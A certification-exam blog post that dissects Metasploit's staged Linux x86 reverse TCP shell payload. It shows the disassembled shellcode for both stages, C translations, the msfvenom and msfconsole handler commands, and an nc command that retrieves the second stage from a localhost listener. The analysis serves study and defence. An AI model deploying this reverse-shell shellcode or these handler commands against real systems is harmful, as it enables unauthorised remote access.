---
title: "SLAE x86 Exam - Assignment #5 Part 2"
date: 2021-12-25
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
  - shellcode
  - metasploit
  - x86
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays `msfvenom`) for 32-bit Linux systems.

Programs like `gdb`/`ndisasm`/`libemu` can be used for dissecting the shellcode and performing the analysis.

I chose the following 4 shellcode samples:

Name | Description
-|-
linux/x86/adduser | Create a new user with UID 0
linux/x86/shell/reverse_nonx_tcp | Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_find_tag | Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp_ipv6 | Connect back to attacker and spawn a command shell over IPv6

In this post I'll analyse `linux/x86/shell/reverse_nonx_tcp`.

## Analysis

### NDISASM

To generate the payload:

```bash
msfvenom -p linux/x86/shell/reverse_nonx_tcp -o shellcode.bin
```

To analyse it with `ndisasm`:

```bash
ndisasm shellcode.bin -b 32 -p intel
```

It returns the following output (comments are mine though):

```nasm
                            ; push 0x00000000
00000000  31DB              xor ebx,ebx
00000002  53                push ebx

                            ; push 0x00000001
00000003  43                inc ebx
00000004  53                push ebx

                            ; push 0x02
00000005  6A02              push byte +0x2

                            ; push 0x00000066
00000007  6A66              push byte +0x66

                            ; EAX = 0x66 (102)
00000009  58                pop eax

                            ; 2nd argument of socketcall(): pointer to arguments of SYS_BIND
0000000A  89E1              mov ecx,esp

                            ; call socketcall syscall
0000000C  CD80              int 0x80
```

The instructions above can be converted into the following C code:

```cpp
#define AF_INET       2
#define SOCK_STREAM   1
#define IPPROTO_IP    0

int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
```

So, up until now, it created a TCP socket. The file descriptor of the new socket is stored into `EAX`.

Next, the shellcode connects to the server socket (`127.0.0.1:4444`):

```nasm
                            ; exchanges EAX and EDI
0000000E  97                xchg eax,edi

                            ; EBX = 0x2
0000000F  5B                pop ebx

                            ; inet_aton("127.0.0.1")
00000010  687F000001        push dword 0x100007f

                            ; htons(4444)
00000015  6668115C          push word 0x5c11

                            ; push 0x00000002
00000019  6653              push bx

                            ; 2nd argument of connect(): pointer to sockaddr struct
0000001B  89E1              mov ecx,esp

                            ; syscall 102 (0x66): socketcall
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
```

```nasm
                            ; size of the sockaddr struct
00000020  50                push eax

                            ; Pointer to the sockaddr struct
00000021  51                push ecx

                            ; File Descriptor of the Server Socket
00000022  57                push edi

                            ; 2nd argument of socketcall(): pointer to arguments of connect()
00000023  89E1              mov ecx,esp
```

{% sidenote Based on the manual page of `socketcall`, `ECX` contains a pointer to the arguments for the function called, in this case `SYS_CONNECT`. %}

```nasm
                            ; 1st argument of socketcall(): SYS_CONNECT (EBX = 3)
00000025  43                inc ebx

00000026  CD80              int 0x80
```

The instructions above can be converted into the following C code:

```cpp
struct sockaddr_in client_address;

client_address.sin_family = AF_INET;
inet_aton("127.0.0.1", &client_address.sin_addr);
client_address.sin_port = htons(4444);

connect(fd, (struct sockaddr *)&client_address, sizeof(client_address));
```

After that, data is read from the server:

```nasm
                            ; File Descriptor of the Server Socket
00000028  5B                pop ebx

00000029  99                cdq

                            ; EDX = 0x00000c00 (3072)
0000002A  B60C              mov dh,0xc
```

{% sidenote Since `connect()` stores `0x0` into `EAX` on success, after `CDQ`, the register `EDX` is zeroed %}

```nasm
                            ; EAX = 0x3, which is the read syscall
0000002C  B003              mov al,0x3
0000002E  CD80              int 0x80

00000030  FFE1              jmp ecx
```

{% sidenote Call `read()` in order to receive data from the server socket, and jump to `ECX` (pointer to the top of the stack), where data is stored %}

This last block of code allows the shellcode to receive data from the Server Socket. Data is placed on the stack.

It translates into the following C code:

```cpp
// fd is the file descriptor of the socket created with socket()
// ECX -> pointer to the top of stack, where data will be stored

read(fd, ECX, 3072);
```

Up until now, I only analysed the 1st stage of the shellcode. To analyse the 2nd stage, I had to connect to a listening `Server`:

```bash
sudo msfconsole
# msf6 > use exploit/multi/handler
# msf6 exploit(multi/handler) > set PAYLOAD  linux/x86/shell/reverse_nonx_tcp
# msf6 exploit(multi/handler) > set LHOST 127.0.0.1
# msf6 exploit(multi/handler) > set LPORT 4444
# msf6 exploit(multi/handler) > run -j
```

In another terminal window:

```bash
nc 127.0.0.1 4444 > stage2.bin

ndisasm -b 32 -p intel stage2.bin
```

Follows the assembly of the second stage:

```nasm
                            ; save File Descriptor of the Server Socket into EDI
00000000  89FB              mov ebx, edi

                            ; push 0x00000002 and move it into ECX
00000002  6A02              push byte +0x2
00000004  59                pop ecx
```

{% sidenote The instruction `push byte` is useful when you want to push a 32-bit integer value like `0x00000002` but you have to avoid `NULL` bytes. Moreover, it uses only `2` bytes %}

```nasm
                            ; push 0x0000002f (63) into EAX
00000005  6A3F              push byte +0x3f
00000007  58                pop eax

                            ; call syscall 63: dup2()
00000008  CD80              int 0x80
```

{% sidenote Use `dup2()` to redirect `stderr` to the Server Socket %}


```nasm
0000000A  49                dec ecx

                            ; jump back to 'push byte 0x3f', continue when ECX == -1
0000000B  79F8              jns 0x5
```

{% sidenote The instruction `JNS` is useful when you want your loop to perform another iteration: when `ECX=0` %}

```nasm
                            ; set EAX to 0xb
0000000D  6A0B              push byte +0xb
0000000F  58                pop eax

                            ; clear EDX and use a string terminator (NULL byte)
00000010  99                cdq
00000011  52                push edx

                            ; string '/bin//sh'
00000012  682F2F7368        push dword 0x68732f2f
00000017  682F62696E        push dword 0x6e69622f

                            ; copy the pointer to "/bin//sh" into EBX
0000001C  89E3              mov ebx,esp

                            ; argv argument of execve (array of pointers)
0000001E  52                push edx
0000001F  53                push ebx

                            ; ECX is an array of pointers: first value is pointer to "/bin//sh", second one is 0x00000000
00000020  89E1              mov ecx,esp

                            ; ; syscall 0xb (11): execve
00000022  CD80              int 0x80
```

{% sidenote After input/output/error is redirected, the shellcode spawn a shell (`/bin//sh`) %}

```nasm
00000024  6563686F          arpl [gs:eax+0x6f],bp
00000028  205135            and [ecx+0x35],dl
0000002B  32617A            xor ah,[ecx+0x7a]
0000002E  46                inc esi
0000002F  56                push esi
00000030  4D                dec ebp
00000031  49                dec ecx
00000032  7847              js 0x7b
00000034  0A                db 0x0a
```

These last `9` lines aren't Assembly instructions, but a string that's executed by `execve`:

```bash
echo -n '6563686F20513532617A46564D4978470A' | xxd -r -p

# Output: 
# 'echo Q52azFVMIxG'
```

It seems that, after a shell is spawned, it executes the command `echo Q52azFVMIxG`, whose output is sent to the server socket. This may act as a password to connect to the server.
